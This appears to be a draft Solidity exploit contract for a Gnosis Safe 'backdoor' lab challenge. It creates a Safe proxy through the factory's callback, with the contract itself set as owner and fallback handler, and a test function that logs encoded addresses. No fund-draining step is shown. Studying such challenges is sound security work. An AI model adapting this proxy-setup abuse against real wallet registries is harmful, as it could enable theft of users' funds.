//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

contract BacdoorExploit {
    function start(
        GnosisSafeProxyFactory factory,
        address singleton,
        IProxyCreationCallback callback
    ) public {
        bytes memory selector = abi.encodeWithSignature(
            "setup(address[],uint256,address,bytes,address,address,uint256,address)",
            [address(this)],
            1,
            address(this),
            "",
            address(0),
            address(0),
            0,
            address(0)
        );
        factory.createProxyWithCallback(singleton, selector, 123, callback);
    }

    function test() public {
        bytes memory test1 = abi.encode([address(this)]);
        bytes memory test2 = abi.encode([address(0)]);
        console.logBytes(test1);
        console.logBytes(test2);
    }
}
